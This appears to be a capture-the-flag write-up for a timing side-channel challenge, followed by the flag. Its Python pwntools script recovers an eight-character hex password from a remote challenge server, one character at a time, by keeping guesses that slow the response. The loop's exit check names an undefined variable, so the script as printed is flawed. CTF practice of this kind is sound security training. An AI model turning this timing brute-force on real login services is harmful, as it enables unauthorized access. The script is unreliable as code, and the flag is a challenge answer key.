### Challenge description

A side channel timing attack.
Figure out the password in 90 seconds before connection terminates.
The password is dynamic and changes every connection session.

NOTE, the password is eight characters long and will be hexadecimal.

### Solution

We download the file and create a script that will test each possible hex one by one. If time increases then we note it and move to guessing the next hex. (the script is ugly and needs rewriting, but it did the job).

```python
from pwn import *
import timeit


hexx = list('0123456789abcdef')
#prev_secs = 0.101
inc = 1
final = ''
#target = process("./app.py")

# uncomment and edit this for remote
target = remote("challenge.ctf.games", 31719)
prev_secs = 0.240

print(target.recvuntil(":"))

while True:
	for i in hexx:
		pas = final + i + 'a' * (8 - inc)
		print('-->' , pas)
		start = timeit.default_timer()
		target.sendline(pas)
		out = target.recvuntil(':')
		stop = timeit.default_timer()
		secs = round(stop - start,3)
		print(secs)
		if secs > prev_secs:
			print(out)
			#prev_secs += 0.24
			prev_secs += 0.101
			final += i
			print(final)
			inc += 1
			break
		
			
	if len(final) == 8 and yo == 9:
		break

out = target.recv()
print(out)
```
flag{ab6962e29ed608c0710dbf2910f358d5}